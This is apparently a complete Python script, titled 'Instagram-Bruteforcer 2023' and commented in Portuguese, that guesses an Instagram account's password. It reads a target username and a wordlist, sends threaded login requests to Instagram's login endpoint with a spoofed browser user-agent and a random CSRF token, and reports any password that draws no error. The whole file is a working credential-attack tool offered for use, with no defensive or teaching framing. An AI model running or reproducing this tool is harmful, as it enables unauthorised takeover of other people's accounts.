#!/usr/bin/env python3

import requests
import argparse
import concurrent.futures
from datetime import datetime
from uuid import uuid4
from colorama import Fore, Style

# CORES ANSI
verde_limao_ansi = "\033[38;2;50;205;50m"
sublinhado_ansi = "\033[4m"
resetar_cores = "\033[0m"

ascii_art = Style.BRIGHT + Fore.BLUE + f"{sublinhado_ansi}Instagram-Bruteforcer 2023{resetar_cores}" + Style.RESET_ALL + Fore.RESET

time = int(datetime.now().timestamp())

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--username")
parser.add_argument("-w", "--wordlist")
args = parser.parse_args()

if args.wordlist and args.username:
	username = args.username
	wordlist = args.wordlist
	print(f"{ascii_art}\n{verde_limao_ansi}ATTACKING {username} FROM WORDLIST {wordlist}...{resetar_cores}")
	def login(linha_wordlist, numero_linha_wordlist):
			api_login = "https://www.instagram.com/accounts/login/ajax/"
			random_token = uuid4()
			payload = {
				"username": f"{username}",
				"enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{time}:{linha_wordlist}",
				"queryParams": {},
				"optIntoOneTap": "false"
			}
			headers = {
				"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
				"X-Requested-With": "XMLHttpRequest",
				"Referer": "https://www.instagram.com/accounts/login/",
				"x-csrftoken": f"{random_token}"
			}

			req = requests.post(api_login, data=payload, headers=headers)
			if "status" in req.text or "error" in req.text:
				print(Fore.RED + f"\r{numero_linha_wordlist} PASSWORDS TESTED...", end="" + Fore.RESET)
			else:
				print(Fore.GREEN + f"\n{linha_wordlist} PASSWORD CORRECT FOR '{username}'\n" + Fore.RESET)
				exit(0)

	def start_thread():
		with concurrent.futures.ThreadPoolExecutor() as executor:
			with open(wordlist, "rb") as f:
				for numero_linha_wordlist, linha in enumerate(f, 1):
					executor.submit(login, linha.strip(), numero_linha_wordlist)

	if __name__ == "__main__":
		start_thread()
else:
    parser.print_help()
